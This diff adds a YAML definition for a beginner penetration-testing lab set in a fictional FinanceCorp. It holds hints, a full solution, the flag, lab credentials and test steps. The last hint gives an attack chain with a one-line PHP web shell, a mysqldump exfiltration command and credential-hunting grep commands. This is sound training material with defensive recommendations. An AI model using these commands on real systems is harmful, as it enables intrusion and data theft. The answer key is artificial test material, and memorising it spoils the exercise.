@@ -1,0 +1,962 @@
+name: SSH File Discovery
+description: FinanceCorp requires thorough investigation of accessible files. Navigate directories, search for specific files, and discover information beyond the home directory.
+difficulty: beginner
+category: post-exploitation
+duration_minutes: 120
+objectives:
+  - Navigate Linux file system after authentication
+  - Search for files using find command
+  - Explore directories beyond home directory
+  - Identify readable sensitive files
+  - Capture the flag
+
+scenario: |
+  Your FinanceCorp penetration test continues with file system exploration. James
+  Mitchell wants you to demonstrate the risks of improper file permissions and
+  sensitive data exposure across the file system.
+
+  After gaining SSH access, comprehensive file system enumeration is critical.
+  While user home directories contain personal information, system-wide directories
+  often reveal more sensitive data:
+  - Configuration files in /etc/
+  - Application data in /var/
+  - Temporary files in /tmp/
+  - Web server files in /var/www/
+  - Log files in /var/log/
+  - Backup files scattered throughout the system
+
+  Improper file permissions allow authenticated users to access sensitive data:
+  - Database configuration files with credentials
+  - Web application configuration with API keys
+  - Backup files with sensitive information
+  - Scripts containing hard-coded passwords
+  - Documentation with system architecture
+
+  Common file discovery techniques:
+  - Recursive directory listing
+  - Find command for pattern matching
+  - Grep for content searching
+  - Checking world-readable files
+  - Exploring temporary and backup locations
+
+  Your objective: Explore the FinanceCorp server file system, search for accessible
+  files containing sensitive information, and identify configuration or backup files
+  that reveal additional intelligence.
+
+  **Test Credentials:**
+  - Username: `webadmin`
+  - Password: `WebServer2024#`
+
+flag: "OCR{f1l3_d1sc0v3ry}"
+
+hints:
+  - text: |
+      **File system exploration** after authentication:
+
+      **Why file discovery matters:**
+      - **Configuration files**: Database credentials, API keys
+      - **Backup files**: Complete system snapshots, old passwords
+      - **Temporary files**: In-progress work, forgotten sensitive data
+      - **Log files**: Reveal system activity, may contain secrets
+      - **Web applications**: Source code, config files, upload directories
+      - **Scripts**: Automation with hard-coded credentials
+
+      **Linux file system structure:**
+
+      **/ (root) - Top level directory**
+
+      **/etc/ - Configuration files:**
+      - `/etc/passwd` - User account information (world-readable)
+      - `/etc/shadow` - Password hashes (root only)
+      - `/etc/ssh/sshd_config` - SSH server configuration
+      - `/etc/mysql/` - Database configuration
+      - `/etc/apache2/` - Web server configuration
+      - `/etc/nginx/` - Nginx configuration
+
+      **/home/ - User home directories:**
+      - `/home/username/` - Personal files
+      - Covered in previous labs
+
+      **/var/ - Variable data:**
+      - `/var/www/` - Web server document root
+      - `/var/www/html/` - Default web files
+      - `/var/log/` - System and application logs
+      - `/var/backups/` - System backups
+      - `/var/tmp/` - Temporary files (persists across reboots)
+
+      **/tmp/ - Temporary files:**
+      - World-writable directory
+      - Files deleted on reboot (usually)
+      - Often contains abandoned sensitive data
+
+      **/opt/ - Optional software:**
+      - Third-party applications
+      - May have configuration files
+      - Application-specific data
+
+      **/usr/ - User programs:**
+      - `/usr/local/` - Locally installed software
+      - `/usr/share/` - Shared data files
+
+      **/root/ - Root user home:**
+      - Only accessible to root
+      - Target for privilege escalation
+
+      **Permission-based access:**
+      - You can only access files your user can read
+      - World-readable files: Anyone can read
+      - Group-readable: Members of specific group
+      - Misconfigured permissions: Security vulnerability
+
+      **Common sensitive file locations:**
+
+      **Web application configs:**
+      - `/var/www/html/config.php`
+      - `/var/www/html/wp-config.php` (WordPress)
+      - `/var/www/html/.env`
+
+      **Database configs:**
+      - `/etc/mysql/my.cnf`
+      - `~/.my.cnf`
+      - `/var/www/html/config/database.yml`
+
+      **Backup files:**
+      - `/var/backups/`
+      - `/tmp/backup.tar.gz`
+      - Files ending in `.bak`, `.old`, `.backup`
+      - `config.php.bak`, `database.sql.backup`
+
+      **Temporary files:**
+      - `/tmp/`
+      - `/var/tmp/`
+      - Files left during maintenance
+      - Forgotten credentials or data dumps
+
+      **Documentation:**
+      - `/root/README.txt` (if accessible)
+      - `/var/www/INSTALL.txt`
+      - `notes.txt`, `TODO.txt`
+
+      File system exploration reveals sensitive data beyond user home directories.
+    unlock_after_minutes: 0
+
+  - text: |
+      **Find command** for file discovery:
+
+      **Basic find syntax:**
+      ```bash
+      find [path] [criteria] [action]
+      ```
+
+      **Find by filename:**
+      ```bash
+      find /path -name "filename"
+      ```
+
+      **Examples:**
+      ```bash
+      # Find files named config.php
+      find /var/www -name "config.php"
+
+      # Find all .txt files
+      find /home -name "*.txt"
+
+      # Find all backup files
+      find / -name "*.bak" 2>/dev/null
+
+      # Find files containing "flag" in name
+      find / -name "*flag*" 2>/dev/null
+      ```
+
+      **Find by file type:**
+      ```bash
+      # Find directories only
+      find /etc -type d
+
+      # Find files only (not directories)
+      find /tmp -type f
+
+      # Find symbolic links
+      find / -type l
+      ```
+
+      **Find by permissions:**
+      ```bash
+      # Find world-readable files
+      find / -perm -004 2>/dev/null
+
+      # Find SUID binaries (privilege escalation)
+      find / -perm -4000 2>/dev/null
+
+      # Find SGID binaries
+      find / -perm -2000 2>/dev/null
+      ```
+
+      **Find by user/group:**
+      ```bash
+      # Files owned by specific user
+      find / -user webadmin 2>/dev/null
+
+      # Files owned by root but world-readable
+      find / -user root -perm -004 2>/dev/null
+      ```
+
+      **Find by size:**
+      ```bash
+      # Files larger than 10MB
+      find / -size +10M 2>/dev/null
+
+      # Files smaller than 1KB
+      find / -size -1k 2>/dev/null
+      ```
+
+      **Find by modification time:**
+      ```bash
+      # Modified in last 7 days
+      find /var/www -mtime -7
+
+      # Modified more than 30 days ago
+      find /tmp -mtime +30
+      ```
+
+      **Combining criteria:**
+      ```bash
+      # .php files in /var/www modified in last 7 days
+      find /var/www -name "*.php" -mtime -7
+
+      # World-readable .conf files
+      find /etc -name "*.conf" -perm -004 2>/dev/null
+      ```
+
+      **Important: Error redirection**
+      ```bash
+      2>/dev/null
+      ```
+      - Redirects errors (permission denied) to /dev/null
+      - Keeps output clean
+      - Only shows files you can access
+
+      **Find examples:**
+      ```bash
+      find / -name "config*" 2>/dev/null
+      ```
+      - Search entire filesystem
+      - Files starting with "config"
+      - Hide permission errors
+
+      **Executing commands on found files:**
+      ```bash
+      # Display contents of all found files
+      find /var/www -name "*.php" -exec cat {} \;
+
+      # List details of found files
+      find /tmp -name "*.bak" -exec ls -lh {} \;
+      ```
+
+      **Grep for content search:**
+      ```bash
+      # Find files containing "password"
+      grep -r "password" /var/www 2>/dev/null
+
+      # Find files containing "flag"
+      grep -r "flag" /var/www 2>/dev/null
+
+      # Case-insensitive search
+      grep -ri "password" /etc 2>/dev/null
+      ```
+
+      **Combining find and grep:**
+      ```bash
+      # Find .php files and search for "password"
+      find /var/www -name "*.php" -exec grep -H "password" {} \;
+      ```
+
+      Find command is essential for discovering sensitive files across the file system.
+    unlock_after_minutes: 5
+
+  - text: |
+      **Exploring web application directories:**
+
+      **Default web server locations:**
+
+      **Apache default:**
+      ```bash
+      /var/www/html/
+      ```
+
+      **Nginx default:**
+      ```bash
+      /usr/share/nginx/html/
+      /var/www/html/
+      ```
+
+      **Common web application structure:**
+      ```
+      /var/www/html/
+      ├── index.php          # Main application file
+      ├── config.php         # Configuration (often contains DB creds)
+      ├── .env               # Environment variables
+      ├── admin/             # Admin panel
+      ├── uploads/           # User uploads (potential malicious files)
+      ├── includes/          # Included files
+      ├── assets/            # CSS, JS, images
+      ├── backups/           # Backup files (should not be web-accessible!)
+      └── .git/              # Git repository (information disclosure)
+      ```
+
+      **Navigating to web directory:**
+      ```bash
+      $ cd /var/www/html
+      $ ls -la
+      ```
+
+      **Common sensitive files in web directories:**
+
+      **Configuration files:**
+      - `config.php` - Database credentials, API keys
+      - `.env` - Environment variables (Laravel, modern frameworks)
+      - `wp-config.php` - WordPress database credentials
+      - `configuration.php` - Joomla configuration
+      - `settings.php` - Drupal settings
+      - `database.yml` - Ruby on Rails database config
+
+      **Example config.php:**
+      ```php
+      <?php
+      $db_host = "localhost";
+      $db_user = "webapp_user";
+      $db_pass = "SecretP@ssw0rd";
+      $db_name = "financecorp_db";
+      $api_key = "sk_live_abc123xyz789";
+      ?>
+      ```
+
+      **Backup files:**
+      ```bash
+      # Files ending in .bak, .old, .backup
+      config.php.bak
+      database.sql
+      site_backup.tar.gz
+      ```
+
+      **Source control disclosure:**
+      ```bash
+      # .git directory exposes source code
+      /var/www/html/.git/
+
+      # View git log
+      cd /var/www/html/.git
+      git log
+      # May reveal commits with passwords
+      ```
+
+      **Exploring web directory:**
+      ```bash
+      $ cd /var/www/html
+      $ ls -la
+      total 124
+      drwxr-xr-x 6 www-data www-data  4096 Jan  4 10:00 .
+      drwxr-xr-x 3 root     root      4096 Dec 15 08:00 ..
+      -rw-r--r-- 1 www-data www-data  2156 Jan  3 15:30 index.php
+      -rw-r--r-- 1 www-data www-data   486 Jan  3 15:30 config.php
+      -rw-r--r-- 1 www-data www-data   156 Jan  3 15:30 .env
+      drwxr-xr-x 2 www-data www-data  4096 Jan  3 15:30 admin
+      drwxr-xr-x 2 www-data www-data  4096 Jan  4 09:00 backups
+      drwxr-xr-x 2 www-data www-data  4096 Jan  3 15:30 uploads
+
+      $ cat config.php
+      [database credentials and API keys revealed]
+      ```
+
+      **Backup directory investigation:**
+      ```bash
+      $ cd /var/www/html/backups
+      $ ls -la
+      -rw-r--r-- 1 www-data www-data  45678 Jan  2 02:00 db_backup.sql
+      -rw-r--r-- 1 www-data www-data 123456 Jan  2 02:00 site_backup.tar.gz
+
+      $ cat db_backup.sql
+      # Contains database dump with user credentials, etc.
+      ```
+
+      **Upload directory investigation:**
+      ```bash
+      $ cd /var/www/html/uploads
+      $ ls -la
+      # May contain uploaded files, potential reverse shells
+      ```
+
+      **Finding sensitive files in web directory:**
+      ```bash
+      # Search for configuration files
+      find /var/www -name "config*" 2>/dev/null
+      find /var/www -name ".env" 2>/dev/null
+      find /var/www -name "wp-config.php" 2>/dev/null
+
+      # Search for backup files
+      find /var/www -name "*.bak" 2>/dev/null
+      find /var/www -name "*.sql" 2>/dev/null
+      find /var/www -name "*backup*" 2>/dev/null
+
+      # Search for files containing credentials
+      grep -r "password" /var/www 2>/dev/null
+      grep -r "api_key" /var/www 2>/dev/null
+      grep -r "secret" /var/www 2>/dev/null
+      ```
+
+      **Why web directories are valuable:**
+      - Database credentials for lateral movement
+      - API keys for external service access
+      - Source code reveals application logic
+      - Backup files contain complete data
+      - Upload directories may allow code execution
+
+      Web application directories frequently contain configuration files with sensitive credentials.
+    unlock_after_minutes: 10
+
+  - text: |
+      **Systematic file discovery approach:**
+
+      **Step 1: Identify current access level**
+      ```bash
+      $ whoami
+      webadmin
+
+      $ id
+      uid=1002(webadmin) gid=1002(webadmin) groups=1002(webadmin),33(www-data)
+      ```
+      → Member of www-data group (web server files!)
+
+      **Step 2: Check home directory first**
+      ```bash
+      $ cd ~
+      $ ls -la
+      ```
+      Quick check for obvious files
+
+      **Step 3: Explore web server directories**
+      ```bash
+      $ cd /var/www/html
+      $ ls -la
+      ```
+      - Configuration files
+      - Application code
+      - Backup directories
+
+      **Step 4: Search for common sensitive files**
+      ```bash
+      # Configuration files
+      find /var/www -name "config.php" 2>/dev/null
+      find /var/www -name ".env" 2>/dev/null
+      find /var/www -name "wp-config.php" 2>/dev/null
+
+      # Backup files
+      find /var/www -name "*.bak" 2>/dev/null
+      find /var/www -name "*.sql" 2>/dev/null
+      find /var/www -name "*backup*" 2>/dev/null
+
+      # Files with "flag" in name
+      find /var/www -name "*flag*" 2>/dev/null
+      find / -name "*flag*" 2>/dev/null
+      ```
+
+      **Step 5: Explore specific directories**
+      ```bash
+      # Web root
+      ls -la /var/www/html/
+
+      # Backups directory
+      ls -la /var/www/html/backups/ 2>/dev/null
+
+      # Config directory
+      ls -la /var/www/html/config/ 2>/dev/null
+
+      # Temporary files
+      ls -la /tmp/
+      ls -la /var/tmp/
+      ```
+
+      **Step 6: Read discovered files**
+      ```bash
+      $ cat /var/www/html/config.php
+      $ cat /var/www/html/.env
+      $ cat /var/www/html/backups/notes.txt
+      ```
+
+      **Step 7: Grep for keywords**
+      ```bash
+      # Search for "flag"
+      grep -r "flag" /var/www 2>/dev/null
+
+      # Search for "password"
+      grep -r "password" /var/www 2>/dev/null
+
+      # Search for credentials
+      grep -r "db_pass" /var/www 2>/dev/null
+      ```
+
+      **Priority targets:**
+
+      **High priority (check first):**
+      1. `/var/www/html/config.php`
+      2. `/var/www/html/.env`
+      3. `/var/www/html/backups/`
+      4. `/var/www/html/wp-config.php`
+
+      **Medium priority:**
+      1. `/etc/mysql/` (if readable)
+      2. `/tmp/` and `/var/tmp/`
+      3. Other user home directories
+      4. `/opt/` for third-party apps
+
+      **Low priority:**
+      1. `/var/log/` (logs, large files)
+      2. `/usr/share/` (documentation, examples)
+
+      **Common file discovery patterns:**
+
+      **Finding database credentials:**
+      ```bash
+      $ find /var/www -name "config.php" -exec cat {} \;
+      # or
+      $ grep -r "db_pass" /var/www 2>/dev/null
+      ```
+
+      **Finding API keys:**
+      ```bash
+      $ grep -r "api_key" /var/www 2>/dev/null
+      $ grep -r "secret_key" /var/www 2>/dev/null
+      ```
+
+      **Finding backup files:**
+      ```bash
+      $ find /var/www -name "*.bak" -o -name "*.sql" 2>/dev/null
+      ```
+
+      **World-readable sensitive files:**
+      ```bash
+      $ find /etc -name "*.conf" -perm -004 2>/dev/null
+      ```
+
+      **Files modified recently (may be working files):**
+      ```bash
+      $ find /var/www -type f -mtime -7 2>/dev/null
+      ```
+
+      Systematic file discovery reveals sensitive configuration and backup files.
+    unlock_after_minutes: 15
+
+  - text: |
+      To discover sensitive files on FinanceCorp's server:
+
+      **Step 1: Authenticate**
+      ```bash
+      ssh webadmin@<target>
+      ```
+      - Username: `webadmin`
+      - Password: `WebServer2024#`
+
+      **Step 2: Check identity and groups**
+      ```bash
+      whoami
+      id
+      ```
+      Note group memberships (www-data group = web server access)
+
+      **Step 3: Navigate to web directory**
+      ```bash
+      cd /var/www/html
+      ls -la
+      ```
+
+      **Step 4: Look for common files**
+      ```bash
+      # Configuration files
+      ls -la config.php
+      ls -la .env
+      cat config.php
+      cat .env
+      ```
+
+      **Step 5: Check subdirectories**
+      ```bash
+      # Backups directory
+      ls -la backups/
+      cd backups/
+      ls -la
+
+      # Config directory
+      ls -la config/
+      cd config/
+      ls -la
+      ```
+
+      **Step 6: Use find for specific files**
+      ```bash
+      # Find all .txt files in web directory
+      find /var/www -name "*.txt" 2>/dev/null
+
+      # Find files with "flag" in name
+      find /var/www -name "*flag*" 2>/dev/null
+
+      # Find backup files
+      find /var/www -name "*.bak" 2>/dev/null
+      ```
+
+      **Step 7: Read discovered files**
+      ```bash
+      cat <filename>
+      ```
+
+      **Expected file locations for this lab:**
+      - `/var/www/html/` - Main web directory
+      - `/var/www/html/config.php` - Configuration
+      - `/var/www/html/backups/` - Backup directory
+      - `/var/www/html/backups/*.txt` - Text files
+      - Files may contain credentials, notes, or the flag
+
+      **Useful commands:**
+      ```bash
+      # Navigate to web root
+      cd /var/www/html
+
+      # List all including hidden
+      ls -la
+
+      # Find specific files
+      find . -name "*.txt"
+
+      # Search file contents
+      grep -r "flag" .
+      ```
+
+      **Important notes:**
+      - webadmin user has access to /var/www/ directory
+      - The flag is in a file within the web directory structure
+      - Use `find` and `ls` to locate files
+      - Read files with `cat`
+
+      The flag is in a file within the /var/www/html/ directory structure.
+    unlock_after_minutes: 20
+
+  - text: |
+      Successful SSH authentication and file discovery:
+
+      ```bash
+      $ ssh webadmin@<target_ip>
+
+      webadmin@<target_ip>'s password: [WebServer2024#]
+
+      Welcome to FinanceCorp Web Server
+      Last login: Thu Jan 3 16:15:22 2025 from 10.10.14.7
+
+      webadmin@fin-web-01:~$ whoami
+      webadmin
+
+      webadmin@fin-web-01:~$ id
+      uid=1002(webadmin) gid=1002(webadmin) groups=1002(webadmin),33(www-data)
+
+      webadmin@fin-web-01:~$ cd /var/www/html
+
+      webadmin@fin-web-01:/var/www/html$ ls -la
+      total 48
+      drwxr-xr-x 5 www-data www-data 4096 Jan  4 10:00 .
+      drwxr-xr-x 3 root     root     4096 Dec 15 08:00 ..
+      -rw-r--r-- 1 www-data www-data 2156 Jan  3 15:30 index.php
+      -rw-r--r-- 1 www-data www-data  486 Jan  3 15:30 config.php
+      -rw-r--r-- 1 www-data www-data  156 Jan  3 15:30 .env
+      drwxr-xr-x 2 www-data www-data 4096 Jan  3 15:30 admin
+      drwxr-xr-x 2 www-data www-data 4096 Jan  4 09:00 backups
+      drwxr-xr-x 2 www-data www-data 4096 Jan  3 15:30 uploads
+      -rw-r--r-- 1 www-data www-data 1024 Jan  3 15:30 .htaccess
+
+      webadmin@fin-web-01:/var/www/html$ cat config.php
+      <?php
+      // FinanceCorp Web Application Configuration
+      // Last updated: 2025-01-03
+
+      // Database Configuration
+      $db_host = "10.10.10.100";
+      $db_user = "webapp_user";
+      $db_pass = "W3bApp_DB_P@ss2024#";
+      $db_name = "financecorp_portal";
+
+      // API Configuration
+      $api_endpoint = "https://api.financecorp.local";
+      $api_key = "fc_api_sk_live_xK9mN2pQ4rT6vW8yZ";
+
+      // Application Settings
+      $app_debug = true;
+      $app_env = "production";
+
+      // DO NOT COMMIT THIS FILE TO GIT!
+      ?>
+
+      webadmin@fin-web-01:/var/www/html$ cat .env
+      APP_NAME=FinanceCorp
+      APP_ENV=production
+      APP_DEBUG=true
+      APP_URL=https://portal.financecorp.local
+
+      DB_CONNECTION=mysql
+      DB_HOST=10.10.10.100
+      DB_PORT=3306
+      DB_DATABASE=financecorp_portal
+      DB_USERNAME=webapp_user
+      DB_PASSWORD=W3bApp_DB_P@ss2024#
+
+      webadmin@fin-web-01:/var/www/html$ cd backups
+
+      webadmin@fin-web-01:/var/www/html/backups$ ls -la
+      total 76
+      drwxr-xr-x 2 www-data www-data  4096 Jan  4 09:00 .
+      drwxr-xr-x 5 www-data www-data  4096 Jan  4 10:00 ..
+      -rw-r--r-- 1 www-data www-data 45678 Jan  2 02:00 db_backup.sql
+      -rw-r--r-- 1 www-data www-data 12345 Jan  3 08:00 old_config.php.bak
+      -rw-r--r-- 1 www-data www-data   892 Jan  4 09:00 deployment_notes.txt
+
+      webadmin@fin-web-01:/var/www/html/backups$ cat deployment_notes.txt
+      ================================================================================
+                      FinanceCorp Web Portal Deployment Notes
+      ================================================================================
+
+      Deployment Date: 2025-01-04
+      Deployed By: webadmin
+      Version: 2.1.4
+
+      Pre-Deployment Checklist:
+      ✓ Database backup completed (db_backup.sql)
+      ✓ Configuration files updated
+      ✓ SSL certificates renewed
+      ✓ Dependencies updated
+      ✓ Security patches applied
+
+      Configuration Changes:
+      - Updated database credentials
+      - New API endpoint: https://api.financecorp.local
+      - Enabled debug mode for troubleshooting (TODO: Disable in production!)
+
+      Database Details:
+        Host: 10.10.10.100
+        User: webapp_user
+        Pass: W3bApp_DB_P@ss2024#
+        Database: financecorp_portal
+
+      Backup Location:
+        Database: /var/www/html/backups/db_backup.sql
+        Files: /var/backups/financecorp/site_backup_2025-01-02.tar.gz
+
+      Known Issues:
+      - Debug mode still enabled (security risk!)
+      - Old config backup files in backups/ directory (should be removed)
+      - API rate limiting not configured
+
+      Post-Deployment Tasks:
+      - Monitor error logs for issues
+      - Test payment gateway integration
+      - Disable debug mode after testing
+      - Remove sensitive backup files from web directory
+
+      Security Assessment Flag: OCR{...}
+
+      Contact:
+        IT Support: it@financecorp.local
+        Security: security@financecorp.local
+
+      ================================================================================
+
+      webadmin@fin-web-01:/var/www/html/backups$ cat ../admin
+      cat: ../admin: Is a directory
+
+      webadmin@fin-web-01:/var/www/html/backups$ find /var/www -name "*.sql" 2>/dev/null
+      /var/www/html/backups/db_backup.sql
+
+      webadmin@fin-web-01:/var/www/html/backups$
+      ```
+
+      **Flag location: /var/www/html/backups/deployment_notes.txt**
+      - **File**: `deployment_notes.txt`
+      - **Location**: `/var/www/html/backups/`
+      - **Flag**: `OCR{...}`
+
+      **Critical security findings:**
+
+      **1. Database credentials exposed (CRITICAL):**
+
+      **Location 1: config.php**
+      ```php
+      $db_host = "10.10.10.100";
+      $db_user = "webapp_user";
+      $db_pass = "W3bApp_DB_P@ss2024#";
+      $db_name = "financecorp_portal";
+      ```
+
+      **Location 2: .env file**
+      ```
+      DB_HOST=10.10.10.100
+      DB_USERNAME=webapp_user
+      DB_PASSWORD=W3bApp_DB_P@ss2024#
+      ```
+
+      **Location 3: deployment_notes.txt**
+      - Same credentials repeated in notes
+      - Plain text documentation
+
+      **Exploitation path:**
+      ```bash
+      mysql -h 10.10.10.100 -u webapp_user -p'W3bApp_DB_P@ss2024#'
+      # Direct database access achieved
+      ```
+
+      **2. API keys exposed:**
+      ```php
+      $api_key = "fc_api_sk_live_xK9mN2pQ4rT6vW8yZ";
+      ```
+      - Production API key in source code
+      - Enables unauthorized API access
+      - Potential financial transactions or data access
+
+      **3. Backup files in web directory (HIGH):**
+      - `db_backup.sql` - Complete database dump
+      - `old_config.php.bak` - Old configuration with potential credentials
+      - Located in web-accessible directory
+      - Potentially accessible via HTTP
+
+      **4. Debug mode enabled in production (MEDIUM):**
+      ```php
+      $app_debug = true;
+      $app_env = "production";
+      ```
+      - Reveals detailed error messages
+      - Exposes application structure
+      - Information disclosure vulnerability
+
+      **5. Information disclosure in deployment notes (MEDIUM):**
+      - Complete system architecture documented
+      - Database server location (10.10.10.100)
+      - Backup file locations
+      - Known security issues documented
+      - Admin contact information
+
+      **Real-world attack chain:**
+
+      **Step 1: Initial access (completed)**
+      - SSH as webadmin:WebServer2024#
+
+      **Step 2: File discovery (completed)**
+      - Explored /var/www/html/
+      - Found config.php with database credentials
+      - Found .env with same credentials
+      - Discovered backups/ directory with notes
+
+      **Step 3: Database access**
+      ```bash
+      mysql -h 10.10.10.100 -u webapp_user -p'W3bApp_DB_P@ss2024#'
+      ```
+      - Access to complete financecorp_portal database
+      - Customer data, financial records, user accounts
+
+      **Step 4: Data exfiltration**
+      ```bash
+      # Download existing backup
+      cat /var/www/html/backups/db_backup.sql > /tmp/stolen_db.sql
+
+      # Or create fresh dump
+      mysqldump -h 10.10.10.100 -u webapp_user -p'W3bApp_DB_P@ss2024#' financecorp_portal > /tmp/complete_db.sql
+      ```
+
+      **Step 5: API exploitation**
+      ```bash
+      # Use stolen API key
+      curl -H "Authorization: Bearer fc_api_sk_live_xK9mN2pQ4rT6vW8yZ" \
+           https://api.financecorp.local/customers
+      ```
+
+      **Step 6: Web shell upload (potential)**
+      ```bash
+      # If uploads/ directory is writable
+      echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/uploads/shell.php
+      # Access via HTTP: http://target/uploads/shell.php?cmd=id
+      ```
+
+      **Professional penetration testing report:**
+
+      **FINDING: Database Credentials in Multiple Locations**
+      - Severity: CRITICAL
+      - Files: config.php, .env, deployment_notes.txt
+      - Credentials: webapp_user:W3bApp_DB_P@ss2024#
+      - Database: 10.10.10.100:3306/financecorp_portal
+      - Impact: Complete database compromise, data exfiltration
+      - Recommendation: Use environment variables, credential vault, rotate credentials
+
+      **FINDING: API Key Exposure**
+      - Severity: CRITICAL
+      - File: config.php
+      - Key: fc_api_sk_live_xK9mN2pQ4rT6vW8yZ
+      - Impact: Unauthorized API access, potential financial loss
+      - Recommendation: Use environment variables, rotate API key immediately
+
+      **FINDING: Sensitive Backups in Web Directory**
+      - Severity: HIGH
+      - Location: /var/www/html/backups/
+      - Files: db_backup.sql, old_config.php.bak, deployment_notes.txt
+      - Impact: Database dump potentially web-accessible, information disclosure
+      - Recommendation: Move backups outside web root, implement proper access controls
+
+      **FINDING: Debug Mode in Production**
+      - Severity: MEDIUM
+      - File: config.php
+      - Setting: $app_debug = true in production
+      - Impact: Information disclosure via detailed error messages
+      - Recommendation: Disable debug mode in production environments
+
+      **FINDING: Excessive File Permissions**
+      - Severity: MEDIUM
+      - Files: All web application files readable by authenticated users
+      - Impact: Information disclosure, credential theft
+      - Recommendation: Restrict file permissions, principle of least privilege
+
+      **Defense recommendations:**
+      1. Move all backups outside web-accessible directories
+      2. Use environment variables for all credentials (never hardcode)
+      3. Implement secrets management system (HashiCorp Vault, AWS Secrets Manager)
+      4. Rotate all exposed credentials immediately
+      5. Disable debug mode in production
+      6. Implement proper file permissions (640 for config files)
+      7. Use .gitignore to prevent committing sensitive files
+      8. Regular security audits of file system permissions
+      9. Implement web application firewall
+      10. Monitor file access logs for suspicious activity
+
+      **Lessons for security:**
+      - Configuration files should never contain hardcoded credentials
+      - Backup files must be stored outside web-accessible directories
+      - File permissions are critical for preventing information disclosure
+      - Multiple credential exposures multiply the risk
+      - Debug mode in production is a security vulnerability
+      - Deployment notes should not contain sensitive information
+
+      The flag demonstrates the critical importance of proper file discovery and
+      highlights the severe risks of storing sensitive information in web-accessible
+      directories with improper permissions.
+    unlock_after_minutes: 25
+
+credentials:
+  - username: "webadmin"
+    password: "WebServer2024#"
+    role: "ssh-user"
+    description: "SSH login credentials for webadmin account"
+
+workbook: "wiki/range/linpt/CH_LIN02_SSH_Authentication/03_SSH_File_Discovery/"
+
+test:
+  steps:
+    - name: "Verify SSH port is open"
+      command: "nc -z -w 5 {target.target} 22 && echo 'port_open'"
+      expect: "port_open"
+    - name: "SSH banner check"
+      command: "nc -w 5 {target.target} 22 </dev/null | head -1"
+      expect: "SSH"
+    - name: "SSH login and retrieve flag from web backups"
+      command: "sshpass -p '{cred.ssh-user.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.ssh-user.user}@{target.target} 'cat /var/www/html/backups/deployment_notes.txt 2>/dev/null || grep -r OCR /var/www/ 2>/dev/null' 2>/dev/null"
+      expect: "OCR{f1l3_d1sc0v3ry}"
